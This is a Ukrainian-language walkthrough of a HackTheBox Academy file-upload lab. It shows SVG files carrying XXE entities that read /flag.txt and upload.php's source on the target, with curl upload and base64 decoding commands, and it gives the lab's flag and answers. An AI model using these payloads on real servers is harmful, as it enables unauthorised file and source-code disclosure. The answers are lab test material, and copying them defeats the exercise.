## File Uploads — Limited Uploads: SVG XXE → Source Code Read

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Limited File Uploads](https://academy.hackthebox.com/app/module/136/section/1291)
**Q1 (flag):** `HTB{my_1m4635_4r3_l37h4l}` (decode: `SFRCe215XzFtNDYzNV80cjNfbDM3aDRsfQo=`)
**Q2 (upload dir):** `./images/`

***

## Концепція

Сервер дозволяє лише `.svg` файли — жодного PHP. Але SVG це XML, а XML підтримує **XXE (XML External Entity)** — механізм що дозволяє читати зовнішні файли прямо із XML. Сервер обробляє SVG і вставляє вміст файлу у `<text>` тег → ми читаємо довільні файли сервера.

**Ключовий момент:** XXE виконується коли **сервер рендерить SVG** (вставляє в HTML головної сторінки), а не коли ми просто запитуємо SVG файл напряму.

***

## Як сервер рендерить SVG

```
1. Ми upload xxe.svg
2. Сервер зберігає як ./images/xxe.svg
3. Сервер записує ім'я файлу в ./images/latest.xml
4. Головна сторінка (index.php) читає latest.xml → підставляє SVG в HTML
5. При рендерингу PHP обробляє XXE entity → &xxe; замінюється на вміст файлу
6. view-source:http://TARGET/ → бачимо base64 у <text> тезі
```

***

## Q1 — Читаємо `/flag.txt`

### Крок 1 — Створюємо XXE SVG

```xml
<!-- /tmp/flag.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="40">&xxe;</text>
</svg>
```

**Пояснення кожного рядка:**
- `<!DOCTYPE svg [...]>` — оголошуємо DTD (Document Type Definition) всередині SVG
- `<!ENTITY xxe SYSTEM "...">` — визначаємо зовнішню сутність `xxe` що читає файл
- `php://filter/convert.base64-encode/resource=/flag.txt` — PHP wrapper що читає `/flag.txt` і кодує в base64 (щоб спецсимволи не зламали XML)
- `&xxe;` — місце де буде підставлено вміст файлу

### Крок 2 — Завантаження

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://TARGET_IP:PORT"

cat > /tmp/flag.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="40">&xxe;</text>
</svg>
EOF

curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/flag.svg;type=image/svg+xml"
# File successfully uploaded
```

> `-F "type=image/svg+xml"` — підмінюємо Content-Type, бо сервер перевіряє і Content-Type і MIME magic bytes SVG файлу.

### Крок 3 — Читаємо результат з головної сторінки

```bash
# Головна сторінка тепер містить наш SVG з base64 у <text>
curl -s "$TARGET/" | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d
# HTB{my_1m4635_4r3_l37h4l}
```

**Або через браузер** (надійніше):
```
view-source:http://TARGET_IP:PORT/
```
Знаходимо рядок `<text x="10" y="40">BASE64_ТУТА</text>` → копіюємо base64 → декодуємо.

***

## Q2 — Читаємо `upload.php` (знаходимо upload dir)

### Крок 1 — SVG що читає upload.php

```bash
cat > /tmp/src.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="40">&xxe;</text>
</svg>
EOF

curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/src.svg;type=image/svg+xml"
```

> Важливо вказати `upload.php` (з розширенням!) інакше PHP не знайде файл.

### Крок 2 — Декодуємо вихідний код

```bash
# Витягуємо base64 з головної і декодуємо
curl -s "$TARGET/" \
  | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d
```

**Або через браузер** → копіюємо base64 → термінал:

```bash
echo "PD9waHAK....(весь base64)....Cg==" | base64 -d
```

### Крок 3 — Знаходимо директорію у коді

З декодованого `upload.php`:
```php
$target_dir = "./images/";           // ← ось директорія
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```

**Q2 відповідь:** `./images/`

***

## Повна схема атаки

```
[SVG файл з XXE] ──upload──► [сервер зберігає ./images/src.svg]
                                        ↓
                              [latest.xml = "src.svg"]
                                        ↓
[GET /] ◄── [index.php читає latest.xml → підставляє SVG → XXE виконується]
                                        ↓
                    [PHP читає /flag.txt → base64 → вставляє в <text>]
                                        ↓
              [view-source: бачимо BASE64 у <text> тезі → декодуємо]
```

***

## Чому `curl -s "$TARGET/images/src.svg"` **не працює**

| Запит | Що відбувається | XXE виконується? |
|---|---|---|
| `curl "$TARGET/images/src.svg"` | Apache повертає raw SVG файл | ❌ Ні — Apache не парсить XML |
| `curl "$TARGET/"` | PHP рендерить сторінку, читає SVG | ✅ Так — PHP парсить XML |
